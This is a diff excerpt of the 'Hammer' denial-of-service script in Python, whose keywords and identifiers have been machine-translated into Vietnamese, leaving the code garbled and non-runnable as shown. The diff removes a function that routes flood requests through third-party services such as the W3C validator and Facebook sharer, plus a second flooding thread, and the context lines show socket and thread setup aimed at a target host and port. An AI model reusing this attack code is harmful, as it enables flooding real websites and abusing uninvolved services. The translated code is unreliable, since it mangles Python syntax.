# c-y-c-t-i-cao@@ -23,14 +23,6 @@ def user_agent ():
	trở lại ( uagent )


def  my_bots ():
	 bot toàn cầu
	bot = []
	bot . append ( "http://validator.w3.org/check?uri=" )
	bot . append ( "http://www.facebook.com/sharer/sharer.php?u=" )
	trở lại ( bot )


def  bot_hamising ( url ):
	thử :
		trong khi  Đúng :
@@ -67,13 +59,6 @@ def dos ():
		q . task_done ()


def  dos2 ():
	trong khi  Đúng :
		item = w . get ()
		bot_hamoing ( ngẫu nhiên . lựa chọn ( bot ) + "http: //" + máy chủ )
		w . task_done ()


 cách sử dụng def ():
	print ( '' ' \ 033 [92m Hammer Dos Script v.1 http://www.canyalcin.com/
	Người dùng cuối có trách nhiệm tuân theo tất cả các luật hiện hành.
@@ -131,8 +116,8 @@ def get_parameters ():
	get_parameters ()
	print ( " \ 033 [92m" , máy chủ lưu trữ , "cổng:" , str ( cổng ), "turbo:" , str ( thr ), " \ 033 [0m" )
	print ( " \ 033 [94m. Vui lòng đợi ... \ 033 [0m" )

	user_agent ()
	my_bots ()
	thời gian . ngủ ( 5 )
	thử :
		s  =  ổ cắm . ổ cắm ( ổ cắm . AF_INET , ổ cắm . SOCK_STREAM )
@@ -146,9 +131,6 @@ def get_parameters ():
			t  =  luồng . Chủ đề ( target = dos )
			t . daemon  =  True   # nếu luồng tồn tại, nó sẽ chết
			t . start ()
			t2  =  luồng . Chủ đề ( target = dos2 )
			t2 . daemon  =  True   # nếu luồng tồn tại, nó sẽ chết
			t2 . start ()
		bắt đầu  =  thời gian . thời gian ()
		#tasking
		item  =  0
